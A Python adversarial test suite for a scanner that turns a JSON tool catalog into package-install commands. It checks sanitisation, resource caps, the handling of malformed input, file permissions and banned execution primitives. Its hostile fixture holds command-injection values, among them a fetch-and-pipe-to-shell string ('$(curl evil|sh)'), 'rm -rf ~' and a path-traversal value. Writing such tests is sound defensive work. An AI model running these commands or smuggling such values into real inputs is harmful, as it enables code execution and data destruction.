#!/usr/bin/env python3
"""Adversarial test suite for bin/spellbook-scan.

Run: python3 tests/test_scan.py

Every case asserts against real subprocess output. The suite deliberately
re-proves the happy path alongside each bound, because a scanner that rejects
everything also passes a security test.
"""

from __future__ import annotations

import json
import os
import resource
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCAN = ROOT / "bin" / "spellbook-scan"
SENTINELS = [Path("/tmp/SPELLBOOK_PWNED"), Path("/tmp/SPELLBOOK_PWNED2")]

results: list[tuple[bool, str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    results.append((ok, name, detail))
    print(f"{'PASS' if ok else 'FAIL'}  {name}" + (f"  -- {detail}" if detail else ""))


def run(catalog, env=None, timeout=60):
    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "catalog.json"
        p.write_text(catalog if isinstance(catalog, str) else json.dumps(catalog))
        e = dict(os.environ)
        e["SPELLBOOK_CATALOG"] = str(p)
        e.update(env or {})
        return subprocess.run(
            [str(SCAN)], env=e, capture_output=True, text=True, timeout=timeout
        )


def parse(proc):
    try:
        return json.loads(proc.stdout)
    except Exception:
        return None


# --------------------------------------------------------------------------
# Happy path -- must keep working after every bound is added.
# --------------------------------------------------------------------------
GOOD = {
    "categories": [
        {
            "name": "Capture",
            "blurb": "b",
            "tools": [
                {"bin": "ls", "pkg": "coreutils", "repo": "repo",
                 "what": "w", "cmd": "ls -l", "note": "n"},
                {"bin": "definitely-not-installed-xyz", "pkg": "ghost-pkg",
                 "repo": "aur", "what": "w", "cmd": "c", "note": "n"},
            ],
        }
    ]
}

p = run(GOOD)
doc = parse(p)
check("happy: exit 0", p.returncode == 0, p.stderr[-160:])
check("happy: ok=true", bool(doc and doc.get("ok")))
check("happy: counts 2 total / 1 installed",
      bool(doc and doc["total"] == 2 and doc["installed"] == 1),
      str(doc and (doc.get("total"), doc.get("installed"))))
tools = doc["categories"][0]["tools"] if doc and doc["categories"] else []
check("happy: present tool resolved to a real path",
      any(t["installed"] and t["path"].startswith("/") for t in tools))
check("happy: repo install command composed",
      any(t["install"] == "sudo pacman -S --needed coreutils" for t in tools))
check("happy: aur install command composed",
      any(t["install"] == "yay -S ghost-pkg" for t in tools))
check("happy: bulk line covers the missing aur package",
      bool(doc and "yay -S ghost-pkg" in doc["categories"][0]["installAllMissing"]))

# --------------------------------------------------------------------------
# Injection: hostile bin/pkg values must never reach install text or execute.
# --------------------------------------------------------------------------
for s in SENTINELS:
    s.unlink(missing_ok=True)

HOSTILE = {
    "categories": [
        {
            "name": "Evil",
            "tools": [
                {"bin": "ls; touch /tmp/SPELLBOOK_PWNED", "pkg": "a", "repo": "repo"},
                {"bin": "$(touch /tmp/SPELLBOOK_PWNED2)", "pkg": "a", "repo": "repo"},
                {"bin": "../../../bin/sh", "pkg": "a", "repo": "repo"},
                {"bin": "-rf", "pkg": "a", "repo": "repo"},
                {"bin": "ls", "pkg": "foo; rm -rf ~", "repo": "repo"},
                {"bin": "ls", "pkg": "$(curl evil|sh)", "repo": "repo"},
                {"bin": "ls", "pkg": "-rf", "repo": "repo"},
                {"bin": "ls", "pkg": "../../etc/passwd", "repo": "repo"},
                {"bin": "ls", "pkg": "ok", "repo": "; rm -rf ~"},
            ],
        }
    ]
}
p = run(HOSTILE)
doc = parse(p)
check("hostile: still exits cleanly", p.returncode == 0, p.stderr[-160:])
htools = doc["categories"][0]["tools"] if doc and doc.get("categories") else []

bad_bins = [t for t in htools if t["bin"] not in ("ls",)]
check("hostile: every malformed bin name dropped", not bad_bins, str(bad_bins)[:200])

SHELL_CHARS = [";", "|", "&", "$", "`", "\n", "(", ")", ">", "<", " ../"]
leaked_install = [t["install"] for t in htools
                  if any(c in t["install"] for c in SHELL_CHARS)]
check("hostile: no shell metacharacter in any install command",
      not leaked_install, str(leaked_install)[:200])

leaked_pkg = [t["pkg"] for t in htools
              if any(c in t["pkg"] for c in SHELL_CHARS)]
check("hostile: no shell metacharacter in any emitted pkg name",
      not leaked_pkg, str(leaked_pkg)[:200])

check("hostile: unknown repo value falls back to a known template",
      all(t["repo"] in ("repo", "aur") for t in htools),
      str([t["repo"] for t in htools]))

bulk = doc["categories"][0]["installAllMissing"] if doc and doc.get("categories") else ""
check("hostile: bulk install line free of metacharacters",
      not any(c in bulk for c in [";", "|", "&", "$", "`"]), bulk[:200])

check("hostile: no side-effect file was created",
      not any(s.exists() for s in SENTINELS),
      str([str(s) for s in SENTINELS if s.exists()]))

# --------------------------------------------------------------------------
# Resource bounds.
# --------------------------------------------------------------------------
p = run({"categories": [{"name": "A", "tools": [
    {"bin": "ls", "pkg": "p", "what": "x" * 100} for _ in range(5000)]}]})
d = parse(p)
check("bound: oversized catalog rejected by byte cap",
      p.returncode == 1 and d and "SPELLBOOK_MAX_BYTES" in d["error"],
      (d or {}).get("error", "")[:120])

p = run({"categories": [{"name": f"c{i}", "tools": [{"bin": "ls"}]}
                        for i in range(200)]})
d = parse(p)
check("bound: too many categories rejected",
      p.returncode == 1 and d and "SPELLBOOK_MAX_CATEGORIES" in d["error"],
      (d or {}).get("error", "")[:120])

p = run({"categories": [{"name": "A", "tools": [{"bin": "ls"}
                                                for _ in range(500)]}]})
d = parse(p)
check("bound: too many tools in a category rejected",
      p.returncode == 1 and d and "SPELLBOOK_MAX_TOOLS" in d["error"],
      (d or {}).get("error", "")[:120])

p = run({"categories": [{"name": "A", "tools": [
    {"bin": "ls", "pkg": "p", "what": "y" * 9000}]}]})
d = parse(p)
ok = p.returncode == 0 and d and len(d["categories"][0]["tools"][0]["what"]) <= 2048
check("bound: oversized field truncated, not rejected", bool(ok))

# FIFO: stat() reports 0 bytes then streams forever.
with tempfile.TemporaryDirectory() as td:
    fifo = Path(td) / "fifo.json"
    os.mkfifo(fifo)
    pid = os.fork()
    if pid == 0:
        try:
            with open(fifo, "w") as fh:
                while True:
                    fh.write("A" * 65536)
        except Exception:
            pass
        os._exit(0)
    try:
        e = dict(os.environ)
        e["SPELLBOOK_CATALOG"] = str(fifo)
        fp = subprocess.run([str(SCAN)], env=e, capture_output=True,
                            text=True, timeout=25)
        fd = parse(fp)
        check("bound: FIFO defeated by read-cap (not stat)",
              fp.returncode == 1 and fd and "SPELLBOOK_MAX_BYTES" in fd["error"],
              (fd or {}).get("error", "")[:120])
    except subprocess.TimeoutExpired:
        check("bound: FIFO defeated by read-cap (not stat)", False,
              "HUNG - unbounded read")
    finally:
        try:
            os.kill(pid, 9)
            os.waitpid(pid, 0)
        except Exception:
            pass

# Depth: must fail cleanly, never with a traceback or a stack overflow.
for depth in (100, 20_000, 200_000):
    p = run("{\"categories\":" + "[" * depth + "]" * depth + "}")
    d = parse(p)
    clean = p.returncode == 1 and d is not None and "Traceback" not in p.stderr
    check(f"bound: nesting depth {depth} rejected cleanly", clean,
          f"rc={p.returncode} stderr={p.stderr.strip()[-90:]}")

p = run(GOOD, {"SPELLBOOK_MAX_DEPTH": "3"})
check("bound: nonsensical low depth falls back to default, catalog still parses",
      p.returncode == 0 and (parse(p) or {}).get("ok") is True)

p = run(GOOD, {"SPELLBOOK_MAX_DEPTH": "9"})
check("bound: legitimate raised depth honoured",
      p.returncode == 0 and (parse(p) or {}).get("ok") is True)

# A brace inside a string must not be counted as structure.
p = run({"categories": [{"name": "A", "tools": [
    {"bin": "ls", "pkg": "p", "note": "use ${var} and [[ $x ]] \\\" ok"}]}]})
check("depth counter: braces inside strings ignored",
      p.returncode == 0 and (parse(p) or {}).get("ok") is True,
      p.stdout[:120])

# --------------------------------------------------------------------------
# Untrusted environment values.
# --------------------------------------------------------------------------
for var in ("SPELLBOOK_MAX_BYTES", "SPELLBOOK_MAX_CATEGORIES",
            "SPELLBOOK_MAX_TOOLS", "SPELLBOOK_MAX_FIELD", "SPELLBOOK_MAX_DEPTH"):
    for val in ("abc", "", "-1", "0", "999999999999999999999", "1e9", "0x10"):
        p = run(GOOD, {var: val})
        d = parse(p)
        ok = p.returncode == 0 and d is not None and d.get("ok") is True
        check(f"env: {var}={val!r} degrades to a sane default", ok,
              f"rc={p.returncode} stderr={p.stderr.strip()[-80:]}")

# --------------------------------------------------------------------------
# Malformed structure must not crash.
# --------------------------------------------------------------------------
for label, cat in [
    ("not json", "{nope"),
    ("root is a list", "[]"),
    ("categories is a string", {"categories": "nope"}),
    ("category is a string", {"categories": ["nope"]}),
    ("tools is a number", {"categories": [{"name": "A", "tools": 5}]}),
    ("tool is null", {"categories": [{"name": "A", "tools": [None]}]}),
    ("bin is a number", {"categories": [{"name": "A", "tools": [{"bin": 7}]}]}),
    ("empty object", {}),
    ("nul bytes in field", {"categories": [{"name": "A", "tools": [
        {"bin": "ls", "pkg": "p", "what": "a\u0000b\u007fc"}]}]}),
]:
    p = run(cat)
    check(f"malformed: {label} handled without traceback",
          "Traceback" not in p.stderr and parse(p) is not None,
          p.stderr.strip()[-90:])

# --------------------------------------------------------------------------
# Output file: atomic, 0600, parent 0700.
# --------------------------------------------------------------------------
with tempfile.TemporaryDirectory() as td:
    out = Path(td) / "state" / "scan.json"
    out.parent.mkdir(mode=0o755)
    p = run(GOOD, {"SPELLBOOK_OUT": str(out)})
    check("out: written", out.exists() and p.returncode == 0)
    check("out: file not group/world readable",
          not (out.stat().st_mode & 0o077), oct(out.stat().st_mode))
    check("out: pre-existing 0755 parent tightened to 0700",
          not (out.parent.stat().st_mode & 0o077),
          oct(out.parent.stat().st_mode))
    check("out: no temp files left behind",
          not [f for f in out.parent.iterdir() if f.name.endswith(".tmp")])

# --------------------------------------------------------------------------
# Peak memory on an oversized input, measured rather than assumed.
# --------------------------------------------------------------------------
before = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss
run({"categories": [{"name": "A", "tools": [
    {"bin": "ls", "pkg": "p", "what": "x" * 200} for _ in range(20000)]}]})
peak_mb = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss / 1024
check("memory: child peak RSS under 150 MB on oversized input",
      peak_mb < 150, f"{peak_mb:.1f} MB")

# --------------------------------------------------------------------------
# Static posture: no execution primitives anywhere in the shipped tree.
# --------------------------------------------------------------------------
sources = list((ROOT / "bin").iterdir()) + list(ROOT.glob("*.qml"))
banned = ["subprocess", "os.system", "shell=True", "eval(", "popen", "exec("]
hits = []
for f in sources:
    if not f.is_file():
        continue
    body = f.read_text(errors="replace")
    for line_no, line in enumerate(body.splitlines(), 1):
        code = line.split("#")[0].split("//")[0]
        for b in banned:
            if b in code:
                hits.append(f"{f.name}:{line_no}: {b}")
check("static: no execution primitive in shipped sources", not hits, str(hits)[:200])

qml_cmds = []
for f in ROOT.glob("*.qml"):
    for line_no, line in enumerate(f.read_text().splitlines(), 1):
        if "command:" in line and not line.strip().startswith("//"):
            qml_cmds.append((f.name, line_no, line.strip()))
check("static: exactly 4 fixed-argv Process commands in QML",
      len(qml_cmds) == 4, str([(n, l) for n, l, _ in qml_cmds]))

# Every subprocess must be one of our own helpers under bin/, launched with a
# literal argv. A bare command name would resolve through PATH; an interpolated
# one could be steered by catalog data.
EXPECTED = {"spellbook-state", "spellbook-scan", "spellbook-copy"}
bad_cmds = []
for name, line_no, line in qml_cmds:
    if "root.binDir +" not in line:
        bad_cmds.append(f"{name}:{line_no} not rooted in binDir")
        continue
    if not any(f'"{h}"' in line for h in EXPECTED):
        bad_cmds.append(f"{name}:{line_no} unexpected helper")
check("static: every Process command is a literal helper under bin/",
      not bad_cmds, str(bad_cmds))

check("static: no chmod/shell subprocess remains in QML",
      not any("chmod" in line or "sh\"" in line or "bash" in line
              for _, _, line in qml_cmds),
      str([l for _, _, l in qml_cmds if "chmod" in l]))

# The QML must not write files directly: FileView on a fixed path follows
# symlinks, which is exactly the finding this refactor fixed.
fileview_hits = []
for f in ROOT.glob("*.qml"):
    for line_no, line in enumerate(f.read_text().splitlines(), 1):
        code = line.split("//")[0]
        if "FileView" in code or ".setText(" in code:
            fileview_hits.append(f"{f.name}:{line_no}")
check("static: no FileView or setText() file writes in QML",
      not fileview_hits, str(fileview_hits))

print()
failed = [r for r in results if not r[0]]
print(f"{len(results) - len(failed)}/{len(results)} passed")
if failed:
    print("FAILURES:")
    for _, name, detail in failed:
        print(f"  - {name}  {detail}")
sys.exit(1 if failed else 0)
